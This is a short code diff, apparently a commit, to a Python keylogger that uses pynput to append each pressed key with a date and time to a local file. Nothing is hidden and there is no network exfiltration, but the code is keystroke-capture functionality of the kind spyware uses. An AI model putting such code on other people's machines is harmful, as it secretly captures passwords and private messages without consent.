@@ -1,22 +1,20 @@
 from pynput.keyboard import Key, Listener
 from datetime import date, datetime
-import os
 
-keys = []
 
 #this function prints the pressed key
 def on_press(key):
    write_to_file(key)
 
 #this is a function that writes the keys, with dates to the file
-def write_to_file(keys):
+def write_to_file(key):
    today =  date.today()
    c = datetime.now()
    time_now = c.strftime('%H:%M:%S') #this is the current time
-   with open("keys_logged.txt", "w") as file:
-      for key in keys:
+   with open("keys_logged.txt", "a") as file:
          k = str(key).replace("'", "")
          file.write(str(today))
+         file.write(" ")
          file.write(time_now)
          file.write("  ")
          file.write(k)
